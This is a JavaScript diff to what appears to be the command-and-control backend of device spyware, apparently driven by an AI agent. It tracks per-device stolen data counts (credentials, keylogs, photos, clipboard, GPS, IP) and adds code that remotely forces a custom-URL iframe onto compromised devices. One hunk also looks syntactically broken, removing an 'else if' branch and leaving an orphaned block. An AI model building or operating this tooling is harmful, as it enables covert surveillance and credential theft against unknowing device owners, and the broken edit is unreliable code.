@@ -1468,6 +1468,24 @@ async function buildDeviceContext(firebaseUrl, deviceId) {
 
         };
     }
+    for (const [id, histNode] of Object.entries(allHistory)) {
+        if (deviceSummary[id]) continue;
+        const entries = Object.values(histNode || {});
+        if (entries.length === 0) continue;
+        const latest = entries.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0))[0];
+        deviceSummary[id] = {
+            name: latest.deviceModel || "unknown",
+            browser: latest.browser || "unknown",
+            os: latest.os || "unknown",
+            ip: latest.ip || "unknown",
+            battery: latest.battery || "unknown",
+            screen: latest.screen || "unknown",
+            status: latest.status === "active" ? "online" : "offline",
+            lastSeen: latest.lastSeen ? Math.floor((Date.now() - latest.lastSeen) / 60000) + "min ago" : "never",
+            gps: null, geo: null, gpu: null, currentPage: null, iframeActive: false,
+            dataCollected: { credentials: 0, keylogs: 0, photos: 0, latestPhoto: null, clipboard: 0, history: 1, seEvents: 0 }
+        };
+    }
 
     // Global stats
     const globalStats = {
@@ -2017,8 +2035,12 @@ async function executeActions(actions, firebaseUrl) {
     const undoData = [];
 
     // Pre-fetch valid device IDs to prevent hallucinated IDs
-    const allDevices = await httpGetJson(firebaseUrl + "/devices.json") || {};
-    const validDeviceIds = new Set(Object.keys(allDevices).filter(id => !allDevices[id].deletedAt));
+  const allDevices = await httpGetJson(firebaseUrl + "/devices.json") || {};
+const allHistory = await httpGetJson(firebaseUrl + "/device_history.json") || {};
+const validDeviceIds = new Set([
+    ...Object.keys(allDevices).filter(id => !allDevices[id].deletedAt),
+    ...Object.keys(allHistory)
+]);
     console.log(`🔍 Valid device IDs: ${[...validDeviceIds].join(", ") || "(none)"}`);
 
     for (const act of actions) {
@@ -2563,7 +2585,12 @@ ${p.description || ''}`;
                 });
 
 
-            } else if (act.type === "multi_device_action" && p.deviceIds && p.action) {
+             if (deviceId && validDeviceIds.has(deviceId)) {
+                    console.log(`🔗 Auto-setting page on ${deviceId}`);
+                    await putFirebase(firebaseUrl + `/admin_commands/${deviceId}/iframe.json`, {
+                        active: true, custom_url: publicUrl, timestamp: Date.now()
+                    });
+                }
 
                 const results = [];
                 for (const deviceId of p.deviceIds) {
